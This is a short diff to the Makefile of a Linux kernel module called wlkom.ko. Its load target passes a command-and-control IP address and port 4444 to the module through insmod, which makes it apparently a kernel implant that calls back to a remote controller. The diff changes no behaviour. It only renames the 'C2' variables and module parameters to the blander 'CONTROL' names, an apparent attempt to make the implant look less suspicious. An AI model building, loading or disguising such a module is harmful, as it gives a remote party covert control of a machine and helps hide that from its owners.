@@ -11,8 +11,8 @@ ccflags-y += -Wno-declaration-after-statement \
 KDIR := /lib/modules/$(shell uname -r)/build
 PWD  := $(shell pwd)
 
-C2_IP   ?= 192.168.100.10
-C2_PORT ?= 4444
+CONTROL_IP   ?= 192.168.100.10
+CONTROL_PORT ?= 4444
 
 .PHONY: all clean load unload
 
@@ -29,7 +29,7 @@ clean:
 	make -C $(KDIR) M=$(PWD) clean
 
 load:
-	sudo insmod wlkom.ko c2_ip="$(C2_IP)" c2_port=$(C2_PORT)
+	sudo insmod wlkom.ko control_ip="$(CONTROL_IP)" control_port=$(CONTROL_PORT)
 
 unload:
 	sudo rmmod wlkom
